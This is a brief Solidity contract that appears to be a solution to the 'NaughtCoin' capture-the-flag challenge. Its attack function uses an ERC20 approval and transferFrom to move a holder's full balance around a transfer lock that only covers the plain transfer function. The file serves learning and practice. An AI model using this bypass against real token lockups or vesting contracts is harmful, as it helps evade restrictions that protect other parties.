// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Solution{
    NaughtCoin ncoin;
    constructor(address _cA){
        ncoin = NaughtCoin(_cA);
    }
    // First Approve this contract to spent NaughtCoin, hat perform attack function
    function attack(address add) public {
        ncoin.transferFrom(add, address(this), ncoin.balanceOf(add));
    }
}
